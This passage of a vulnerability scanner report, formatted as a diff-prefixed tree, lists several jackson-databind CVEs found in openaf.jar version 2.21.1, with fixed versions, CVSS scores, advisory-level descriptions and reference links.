-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-                        │      │                           │           /A:H 
-                        │      │                           ╰ V3Score : 8.1 
-                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
-                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
-                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:41951 
-                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:43218 
-                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:43400 
-                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:44061 
-                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:44062 
-                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:44063 
-                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:44064 
-                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:44065 
-                        │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:44066 
-                        │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:44271 
-                        │      │                  ├ [12]: https://access.redhat.com/security/cve/CVE-2026-54513 
-                        │      │                  ├ [13]: https://bugzilla.redhat.com/2492010 
-                        │      │                  ├ [14]: https://bugzilla.redhat.com/2492015 
-                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
-                        │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2492015 
-                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-54512 
-                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-54513 
-                        │      │                  ├ [19]: https://errata.almalinux.org/9/ALSA-2026-40895.html 
-                        │      │                  ├ [20]: https://errata.rockylinux.org/RLSA-2026:40895 
-                        │      │                  ├ [21]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [22]: https://github.com/FasterXML/jackson-databind/commit/
-                        │      │                  │       01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
-                        │      │                  ├ [23]: https://github.com/FasterXML/jackson-databind/commit/
-                        │      │                  │       24529da29fdf46ff94ca38de9ebf31cd188f5e8e 
-                        │      │                  ├ [24]: https://github.com/FasterXML/jackson-databind/issues/
-                        │      │                  │       5981 
-                        │      │                  ├ [25]: https://github.com/FasterXML/jackson-databind/issues/
-                        │      │                  │       5983 
-                        │      │                  ├ [26]: https://github.com/FasterXML/jackson-databind/pull/5984 
-                        │      │                  ├ [27]: https://github.com/FasterXML/jackson-databind/securit
-                        │      │                  │       y/advisories/GHSA-rmj7-2vxq-3g9f 
-                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-54513.html 
-                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-43400.html 
-                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
-                        │      │                  ├ [31]: https://security.access.redhat.com/data/csaf/v2/vex/2
-                        │      │                  │       026/cve-2026-54513.json 
-                        │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
-                        │      ╰ LastModifiedDate: 2026-07-23T12:18:26.847Z 
-                        ├ [3]  ╭ VulnerabilityID : CVE-2026-54514 
-                        │      ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54514 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:0aef4ed1d88407acf98f0ac1089c799884d1fb26995dceb1fd87f
-                        │      │                   dbd66be72a9 
-                        │      ├ Title           : jackson-databind: jackson-databind: Information Disclosure
-                        │      │                   via Eager DNS Resolution 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4,
-                        │      │                   JDKFromStringDeserializer constructed InetSocketAddress with
-                        │      │                    new InetSocketAddress(host, port), which performs eager DNS
-                        │      │                    name resolution for hostname inputs at deserialization
-                        │      │                   time. An application that binds untrusted JSON into a type
-                        │      │                   containing an InetSocketAddress field issues an
-                        │      │                   attacker-chosen DNS query during readValue, before any
-                        │      │                   application-level validation or connect logic. The fix uses
-                        │      │                   InetSocketAddress.createUnresolved(host, port), deferring
-                        │      │                   DNS to an explicit connect. This vulnerability is fixed in
-                        │      │                   2.18.8, 2.21.4, and 3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-918 
-                        │      ├ VendorSeverity   ╭ amazon: 3 
-                        │      │                  ├ ghsa  : 2 
-                        │      │                  ╰ redhat: 2 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-                        │      │                  │        │           /A:N 
-                        │      │                  │        ╰ V3Score : 5.3 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-                        │      │                           │           /A:N 
-                        │      │                           ╰ V3Score : 5.3 
-                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54514 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/1
-                        │      │                  │      f5a1037b1e9e05920e755cb35f198bcd46667e4 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5951 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-hgj6-7826-r7m5 
-                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54514 
-                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54514 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.467Z 
-                        │      ╰ LastModifiedDate: 2026-06-27T20:55:09.61Z 
-                        ├ [4]  ╭ VulnerabilityID : CVE-2026-54515 
-                        │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:37346e346b1b38929eee3b77f492d48d5554b962416db016d8e88
-                        │      │                   e166518f415 
-                        │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can
-                        │      │                   be unexpectedly modified 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
-                        │      │                   BeanDeserializerBase.createContextual(), per-property
-                        │      │                   @JsonIgnoreProperties exclusions are applied by
-                        │      │                   _handleByNameInclusion(), producing a contextual
-                        │      │                   deserializer whose BeanPropertyMap has the ignored
-                        │      │                   properties removed. The subsequent per-property
-                        │      │                   case-insensitivity block (triggered by
-                        │      │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
-                        │      │                   from this._beanProperties (the original, unfiltered map)
-                        │      │                   instead of contextual._beanProperties, then overwrites the
-                        │      │                   filtered map — restoring every property
-                        │      │                   _handleByNameInclusion had just removed. The ignored
-                        │      │                   property becomes writable again. This vulnerability is fixed
-                        │      │                    in 2.18.9, 2.21.5, and 3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-915 
-                        │      ├ VendorSeverity   ╭ amazon: 3 
-                        │      │                  ├ ghsa  : 2 
-                        │      │                  ╰ redhat: 2 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-                        │      │                  │        │           /A:N 
-                        │      │                  │        ╰ V3Score : 5.3 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-                        │      │                           │           /A:N 
-                        │      │                           ╰ V3Score : 5.3 
-                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0
-                        │      │                  │      e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
-                        │      │                  │      962 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5
-                        │      │                  │      964 
-                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-5jmj-h7xm-6q6v 
-                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
-                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
-                        │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
-                        ├ [5]  ╭ VulnerabilityID : CVE-2026-54516 
-                        │      ├ VendorIDs        ─ [0]: GHSA-9fxm-vc8v-hj55 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54516 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:8d079e571436a0527673bdfc0b70997df3c89b7cd857d1b997282
-                        │      │                   940204fd30d 
-                        │      ├ Title           : jackson-databind: jackson-databind: Security bypass due to
-                        │      │                   improper handling of renamed properties 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
-                        │      │                   POJOPropertiesCollector._renameProperties() allows a
-                        │      │                   property with @JsonProperty("renamed") on the getter and
-                        │      │                   @JsonIgnore on the setter to be renamed rather than dropped.
-                        │      │                    With MapperFeature.INFER_PROPERTY_MUTATORS enabled
-                        │      │                   (default), the private backing field is retained; during
-                        │      │                   deserialization BeanDeserializerFactory.addBeanProps() sees
-                        │      │                   hasField()==true, builds a FieldProperty, and makes the
-                        │      │                   backing field writable. An attacker supplying the renamed
-                        │      │                   JSON key writes the backing field directly, bypassing the
-                        │      │                   @JsonIgnore on the setter. This vulnerability is fixed in
-                        │      │                   3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-915 
-                        │      ├ VendorSeverity   ╭ ghsa  : 2 
-                        │      │                  ╰ redhat: 2 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-                        │      │                  │        │           /A:N 
-                        │      │                  │        ╰ V3Score : 5.3 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-                        │      │                           │           /A:N 
-                        │      │                           ╰ V3Score : 5.3 
-                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54516 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c
-                        │      │                  │      3d56dd25d52319828147c5b9aeabf2d485c250a 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/e
-                        │      │                  │      88cb17006b6af4883b973058f0bb6486e5074af 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5967 
-                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5968 
-                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-9fxm-vc8v-hj55 
-                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54516 
-                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54516 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.723Z 
-                        │      ╰ LastModifiedDate: 2026-06-27T20:52:12.103Z 
-                        ├ [6]  ╭ VulnerabilityID : CVE-2026-54517 
-                        │      ├ VendorIDs        ─ [0]: GHSA-5hh8-q8hv-fr38 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54517 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:efed2af6e6e39da2f537954de6b95e1467b7d4d609b4f2dcc5243
-                        │      │                   98a705c68b9 
-                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
-                        │      │                   via improper JsonView filter application 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4, in
-                        │      │                   BeanDeserializer._deserializeUsingPropertyBased, the
-                        │      │                   active-view (@JsonView) filter was applied only to creator
-                        │      │                   properties; the regular property-buffering branch performed
-                        │      │                   no prop.visibleInView(activeView) check. A change making
-                        │      │                   SetterlessProperty.isMerging() return true routed setterless
-                        │      │                    Collection/Map properties through this unguarded path, so a
-                        │      │                    setterless collection annotated with a restricted @JsonView
-                        │      │                    is populated from attacker JSON even when the active view
-                        │      │                   excludes it. This vulnerability is fixed in 2.21.4 and
-                        │      │                   3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-863 
-                        │      ├ VendorSeverity   ╭ ghsa  : 2 
-                        │      │                  ╰ redhat: 2 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-                        │      │                  │        │           /A:N 
-                        │      │                  │        ╰ V3Score : 5.3 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-                        │      │                           │           /A:N 
-                        │      │                           ╰ V3Score : 5.3 
-                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54517 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/5
-                        │      │                  │      bf23edb4221f7dd2ec8e71ff6d26c61640f261d 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/9
-                        │      │                  │      4c5d215b3af1505098c686405d9641f041a9962 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5969 
-                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5970 
-                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-5hh8-q8hv-fr38 
-                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54517 
-                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54517 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.853Z 
-                        │      ╰ LastModifiedDate: 2026-06-27T20:51:09.987Z 
-                        ├ [7]  ╭ VulnerabilityID : CVE-2026-54518 
-                        │      ├ VendorIDs        ─ [0]: GHSA-rcqc-6cw3-h962 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.21.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54518 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:26f498787bb4885213903448e6c33d71e847719a982b77812023f
-                        │      │                   5765abac462 
-                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
-                        │      │                   and data manipulation via view-based access control bypass[
-                        │      │                   m 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
-                        │      │                   UnwrappedPropertyHandler.processUnwrappedCreatorProperties()
-                        │      │                    replays buffered JSON into creator parameters but never
-                        │      │                   consults prop.visibleInView(activeView). The normal
-                        │      │                   property-based creator path gates creator properties on the
-                        │      │                   active view, but this unwrapped-creator replay path bypasses
-                        │      │                    that check, so a constructor parameter annotated with both
-                        │      │                   @JsonView(AdminView.class) and @JsonUnwrapped is populated
-                        │      │                   from attacker JSON even when a more restrictive view is
-                        │      │                   active. This vulnerability is fixed in 2.21.4 and 3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-863 
-                        │      ├ VendorSeverity   ╭ ghsa  : 2 
-                        │      │                  ╰ redhat: 2 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
-                        │      │                  │        │           /A:N 
-                        │      │                  │        ╰ V3Score : 6.5 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
-                        │      │                           │           /A:N 
-                        │      │                           ╰ V3Score : 6.5 
-                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54518 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/7
-                        │      │                  │      21fa07ebbd4aab4a659a1a68940878315c3e341 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/d
-                        │      │                  │      633bc038f200c1397c07f1a2b46f58e72c91eea 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5971 
-                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5973 
-                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-rcqc-6cw3-h962 
-                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54518 
-                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54518 
-                        │      ├ PublishedDate   : 2026-06-23T22:16:32.073Z 
-                        │      ╰ LastModifiedDate: 2026-06-27T20:49:30.977Z 
-                        ├ [8]  ╭ VulnerabilityID : CVE-2026-59888 
-                        │      ├ VendorIDs        ─ [0]: GHSA-3pjw-73gf-8qr5 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.8, 2.21.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59888 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:873bae9c9caa84a328640545bc07333b9db8e995622962f9b4a54
-                        │      │                   f584be502d1 
-                        │      ├ Title           : jackson-databind: @JsonIgnore on a Record property is
-                        │      │                   bypassed with a PropertyNamingStrategy 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records
-                        │      │                   using a PropertyNamingStrategy can bypass @JsonIgnore
-                        │      │                   because POJOPropertiesCollector._removeUnwantedIgnorals()
-                        │      │                   records an ignored component under its original implicit
-                        │      │                   name before _renameUsing() applies the naming strategy,
-                        │      │                   allowing the renamed JSON key to be assigned to the Record
-                        │      │                   constructor parameter. This issue is fixed in versions
-                        │      │                   2.18.8, 2.21.4, and 3.1.4. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-915 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
-                        │      │                         ╰ V3Score : 6.5 
-                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/b
-                        │      │                  │      aa2cdf5ca2b2717fbb88d91955d69d8651df3e4 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c
-                        │      │                  │      7c678360624da5bc7eed2152789fa522880db9d 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5974 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                  │      /advisories/GHSA-3pjw-73gf-8qr5 
-                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59888 
-                        │      ├ PublishedDate   : 2026-07-14T17:17:15.137Z 
-                        │      ╰ LastModifiedDate: 2026-07-15T20:18:23.677Z 
-                        ├ [9]  ╭ VulnerabilityID : CVE-2026-59889 
-                        │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:9ae3d9543a42e3e8561360660acb7821903d0e30f04bc7c295118
-                        │      │                   4df251748b7 
-                        │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
-                        │      │                   container properties on deserialization 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
-                        │      │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
-                        │      │                    JSON for a @JsonUnwrapped property and calls
-                        │      │                   prop.deserializeAndSet() without a
-                        │      │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
-                        │      │                   property annotated with both @JsonView and @JsonUnwrapped to
-                        │      │                    be written from attacker JSON under a less-privileged
-                        │      │                   active view. This issue is fixed in versions 2.18.9, 2.21.5,
-                        │      │                    2.22.1, 3.1.5, and 3.2.1. 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ CweIDs           ─ [0]: CWE-863 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
-                        │      │                         ╰ V3Score : 6.5 
-                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d
-                        │      │                  │      627a8a86fcb062429282f79f3f256f181ed2c7b 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6
-                        │      │                  │      060 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
